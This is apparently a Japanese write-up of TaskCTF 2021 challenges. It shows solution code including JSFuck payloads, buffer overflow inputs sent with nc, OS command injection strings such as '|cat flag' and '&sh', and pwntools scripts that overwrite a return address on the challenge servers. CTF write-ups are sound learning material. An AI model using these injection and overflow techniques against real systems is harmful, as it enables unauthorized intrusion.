# TaskCTF 2021 Writeup

面白かったです！主催者の[task4233](https://www.twitter.com/task4233)さん、素晴らしいCTFをありがとうございました。

## Welcome

### welcome

Sanity Check. C&P.

## Misc

### js

うまく記号だけのJavaScriptコードで `yes` という文字列を表現してPOSTすればFlagを取得することができます。([参考1](https://tech.atsu-maru.co.jp/entry/2019/01/28/080000),[参考2](https://github.com/aemkei/jsfuck/blob/master/jsfuck.js))

```python
import requests
print(requests.post("http://34.145.29.222:30009", json={'want_flag': '(+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[[+!+[]]+[+[]]]+(!![]+([]+[]))[!+[]+!+[]+!+[]]+(![]+([]+[]))[!+[]+!+[]+!+[]]'}).text)
# taskctf{js_1s_4_tr1cky_l4ngu4ge}
```

### polyglot / polygolf

C言語、Go言語の両方で動作する（かつpolygolfでは185バイト以下のサイズの）コードを作成して送信することでFlagを取得することができます。([参考](https://gist.github.com/nelhage/813a13bd7f5adfdcfca4fb17abb1c7d6))

以下は私が書いて使用したコード。

```
// \
/*
main(){system("cat flag");}
#if 0
//*/package main
import(."fmt"
."os/exec")
func main(){f,_:=Command("cat", "flag").Output()
Print(string(f))}
// \
/*
#endif//*/
```

## Pwnable

### super_easy

BOFするように適当なPayloadを送信すればFlagを取得することができます。

```
$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | nc 34.145.29.222 30002
Input task name
task
task name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
task done: 1094795585
taskctf{bre4k_e4sily}
```

### super_easy2

スコアの値が0x1337になるようなPayloadを送信すればFlagを取得することができます。

```
$ echo -e 'AAAAAAAAAAAAAAAA\x01\x00\x00\x00\x37\x13\x00\x00' | nc 34.145.29.222 30003
Input task name
task
task name: AAAAAAAAAAAAAAAA
task done: 1
taskctf{y0u_c4n_4ls0_0verwr1te}
```

### script_kiddie

配布されているソースコードを読んでみると、自明なOSコマンドインジェクション脆弱性が見つかるので、`cat flag` するようなPayloadを送信すればFlagを取得することができます。

```
$ echo '|cat flag' | nc 34.145.29.222 30005
Which flag do you want?taskctf{n0w_y0u_g0t_shell}
```

### super_easy3

新しく加わった `deadline` によるチェックをクリアできるようにExploitすればFlagを取得することができます。 

```c
// gcc genpayload.c -o genpayload
#include <stdio.h>
#include <stdint.h>
#include <time.h>

typedef struct {
  char name[16];
  uint32_t is_done;
  uint32_t score;
  double rate;
  time_t deadline;
} TASK;

int main()
{
    TASK task = {"AAAAAAAAAAAAAAAA",1,0x1337,999,time(NULL)};
    FILE *fp = fopen("/tmp/task.tmp", "wb");
    fwrite(&task, sizeof(TASK), 1, fp);
    return 0;
}
```

```python
from pwn import *
import subprocess

io = remote('34.145.29.222', 30004)
subprocess.run(["./genpayload"])
cs = open('/tmp/task.tmp','rb').read()
io.send(cs)
io.interactive()
```

```
$ python3 solve.py
[+] Opening connection to 34.145.29.222 on port 30004: Done
[*] Switching to interactive mode
Input task name
$
task
task name: AAAAAAAAAAAAAAAA
task done: 1
task score: 4919
task deadline: Sun Dec 12 10:11:39 2021

taskctf{n0w_y0u_kn0w_t1me_t}[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to 34.145.29.222 port 30004
```

### script_kiddie2

`sh` して `cat flag` すればFlagを取得することができます。

```
$ nc 34.145.29.222 30007
Which flag do you want?&sh

cat flag
taskctf{sh_1s_als0_0k}
```

### prediction

Return Addressを書き換えるようなExploitを書けばFlagを取得することができます。

```python
from pwn import *
import struct

io = remote('34.145.29.222', 30006)

payload = b'taskctf{'
payload += b'A'*48
payload += struct.pack('<I', 0x4013F7)
io.sendline(payload)
io.sendline(b'cat flag')
io.interactive()
```

```
> python .\prediction_solve.py
[x] Opening connection to 34.145.29.222 on port 30006
[x] Opening connection to 34.145.29.222 on port 30006: Trying 34.145.29.222
[+] Opening connection to 34.145.29.222 on port 30006: Done
[*] Switching to interactive mode
What is the flag?
***start stack dump***
0x7fff7a7cc980: 0x7b6674636b736174 <- rsp
0x7fff7a7cc988: 0x4141414141414141
0x7fff7a7cc990: 0x4141414141414141
0x7fff7a7cc998: 0x4141414141414141
0x7fff7a7cc9a0: 0x4141414141414141
0x7fff7a7cc9a8: 0x4141414141414141
0x7fff7a7cc9b0: 0x4141414141414141 <- rbp
0x7fff7a7cc9b8: 0x00000000004013f7 <- return address
0x7fff7a7cc9c0: 0x0000000000000000
0x7fff7a7cc9c8: 0x00007ff3b999c0b3
0x7fff7a7cc9d0: 0x00007ff3b9b616a0
***end stack dump***

taskctf{r0p_1s_f4mous_way}
```

別解:

```
$ strings prediction | grep taskctf{
taskctf{
taskctf{r0p_1s_f4mous_way}
```
